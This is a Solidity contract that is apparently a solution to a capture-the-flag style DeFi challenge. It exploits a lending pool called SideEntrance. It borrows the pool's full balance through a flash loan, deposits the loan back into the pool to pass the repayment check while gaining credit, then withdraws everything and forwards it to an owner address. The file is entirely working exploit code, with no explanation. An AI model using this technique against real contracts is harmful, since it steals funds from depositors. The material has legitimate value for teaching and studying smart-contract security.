// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntrance {
    function withdraw() external;

    function deposit() external payable;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    ISideEntrance public sideEntrance;
    address public owner;

    constructor(address _sideEntrance, address _owner) {
        sideEntrance = ISideEntrance(_sideEntrance);
        owner = _owner;
    }

    function attack() external payable {
        sideEntrance.flashLoan(address(sideEntrance).balance);
        sideEntrance.withdraw();
        (bool success, ) = owner.call{value: address(this).balance}("");
    }

    function execute() external payable {
        sideEntrance.deposit{value: msg.value}();
    }

    receive() external payable {}
}
